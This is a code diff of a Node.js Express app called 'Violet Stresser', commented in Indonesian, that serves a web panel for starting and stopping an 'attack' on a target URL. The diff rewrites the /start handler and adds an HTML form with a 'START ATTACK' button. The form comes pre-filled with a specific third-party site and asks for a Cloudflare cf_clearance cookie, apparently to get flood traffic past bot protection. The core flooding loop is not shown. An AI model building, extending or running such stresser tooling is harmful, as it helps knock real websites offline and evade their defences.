@@ -96,26 +96,21 @@ function startAutoLoop(target, cookie) {
 // 1. START ATTACK (Input Target & Cookie Langsung Disini)
 // Cara Pakai: POST /start?target=https://site.com&cookie=cf_clearance=xxx
 // ATAU via Body JSON: { "target": "...", "cookie": "..." }
-app.post('/start', (req, res) => {    // Ambil dari Query Parameter atau Body JSON (biar fleksibel)
-    let target = req.query.target || (req.body ? req.body.target : null);
-    let cookie = req.query.cookie || (req.body ? req.body.cookie : null);
+app.post('/start', (req, res) => {
+    // Ambil dari Body (Form HTML) atau Query/JSON
+    let target = req.body.target || req.query.target;
+    let cookie = req.body.cookie || req.query.cookie;
 
     if (!target || !cookie) {
-        return res.status(400).send("Error: Please provide 'target' and 'cookie'.<br>Example: /start?target=https://google.com&cookie=cf_clearance=...");
+        return res.status(400).send("Error: Missing target or cookie");
     }
 
-    // Format Target
-    if (!target.startsWith("http")) {
-        target = "https://" + target;
-    }
+    if (!target.startsWith("http")) target = "https://" + target;
 
-    // Jika sudah ada yang jalan, matikan dulu
     if (currentSession && currentSession.isActive) {
         currentSession.isActive = false;
-        console.log("[SYSTEM] Previous session stopped.");
     }
 
-    // Mulai Session Baru
     startAutoLoop(target, cookie);
 
     res.send(`
@@ -156,16 +151,26 @@ app.get('/status', (req, res) => {
 });
 
 // Home Page
+// Home Page dengan Form Input (Lebih Mudah daripada URL Panjang)
 app.get('/', (req, res) => {
     res.send(`
-        <h1>🚀 Violet Stresser Easy API</h1>
-        <p>Use this endpoint to start attack:</p>
-        <code>POST /start?target=URL&cookie=COOKIE</code>
-        <br><br>
-        <p>Or use Body JSON:</p>
-        <pre>{ "target": "https://...", "cookie": "cf_clearance=..." }</pre>
-        <br>
-        <p><a href="/status">Check Status</a></p>
+        <html>
+        <head><title>Violet Stresser API</title></head>
+        <body style="font-family:sans-serif; padding:20px; background:#121212; color:white;">
+            <h1>🚀 Violet Stresser Easy Start</h1>
+            <form action="/start" method="POST">
+                <label>Target URL:</label><br>
+                <input type="text" name="target" value="https://kartutoto.com/" style="width:100%; padding:10px; margin-bottom:10px;"><br>
+                
+                <label>Cookie (cf_clearance):</label><br>
+                <textarea name="cookie" placeholder="Paste cf_clearance=... here" style="width:100%; height:100px; padding:10px; margin-bottom:10px;"></textarea><br>
+                
+                <button type="submit" style="padding:15px 30px; background:green; color:white; border:none; cursor:pointer;">START ATTACK</button>
+            </form>
+            <hr>
+            <p><a href="/status" style="color:cyan;">Check Status</a> | <a href="/stop" style="color:red;">Stop Attack</a></p>
+        </body>
+        </html>
     `);
 });
 
